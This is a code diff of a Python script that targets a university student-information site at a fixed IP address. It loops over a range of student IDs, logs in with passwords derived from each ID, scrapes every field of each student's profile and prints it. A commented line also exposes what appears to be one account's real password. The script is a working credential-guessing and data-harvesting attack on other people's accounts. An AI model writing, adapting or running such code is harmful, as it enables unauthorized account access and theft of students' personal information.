@@ -3,11 +3,11 @@ import requests
 import urllib
 import datetime
 import time
-ctguRequest = requests.session()
+from bs4 import BeautifulSoup
 
 def getCookie():
     loginUrl = "http://210.42.35.33/xg/home/login.do"
-    result =  ctguRequest.get(loginUrl)
+    result =  requests.get(loginUrl)
     return result.cookies['JSESSIONID']
 
 def createHeaders(cookie):
@@ -27,35 +27,59 @@ def createHeaders(cookie):
     return headers
 
 def login(username,password,headers):
+    ctguRequest = requests.session()
     form = {
         'user_name':username,
         'pass_word':password
     }
     data = urllib.urlencode(form)
     thistime = time.mktime(datetime.datetime.now().timetuple())
-
     try:
         loginUrl = "http://210.42.35.33/xg/home/login.do"
         result = ctguRequest.post(loginUrl,headers=headers,data=data)
-        # infoUrl = 'http://210.42.35.33/xg/student/toTableInfo.do?_tsp_=1445415129990&typeid=info&studentId=2012136121&method=edit'
-        infoUrl = 'http://210.42.35.33/xg/student/toTableInfo.do?_tsp_='+thistime+'&typeid=info&studentId='+username+'&method=edit'
-        print infoUrl
-        page = ctguRequest.get(infoUrl,headers=headers).text
-        print page
-        logOutUrl = 'http://210.42.35.33/xg/home/logout.do'
-        ctguRequest.get(logOutUrl,headers=headers)
+        # print result.history
+
+        infoUrl = 'http://210.42.35.33/xg/student/toTableInfo.do?_tsp_='+str(thistime-10)+'&typeid=info&studentId='+str(username)+'&method=edit'
+        # print infoUrl
+        page = ctguRequest.get(infoUrl,headers=headers)
+        # print page.text
+        soup = BeautifulSoup(page.text)
+
+        divSum = soup.find_all('div','am-form-group am-g')
+
+        # 获取到姓名和学号
+        nameDiv = divSum[0].find_all('div')
+        name = nameDiv[1].input['value']
+
+        numDiv = divSum[1].find_all('div')
+        num = numDiv[1].input['value']
+
+        # 获取到所有信息
+        for divlist in divSum:
+            # print divlist
+            list = divlist.find_all('div')
+            try:
+                key =  list[0].label.string
+                value =  list[1].input['value']
+                print key,value
+            except:
+                pass
+
+
     except:
         pass
 
+    finally:
+        logOutUrl = 'http://210.42.35.33/xg/home/logout.do'
+        ctguRequest.get(logOutUrl,headers=headers)
+
 
 if __name__ =='__main__':
-    cookie = getCookie()
-    headers = createHeaders(cookie)
     for i in range(2012136101,2012136136):
+        cookie = getCookie()
+        headers = createHeaders(cookie)
         j = i - 2012000000
         login(i,j,headers)
+    # cookie = getCookie()
+    # headers = createHeaders(cookie)
     # login(2012136121,'f7t9Cy2eiR9r',headers)
-    # login(2012136120,136120,headers)
-
-
-
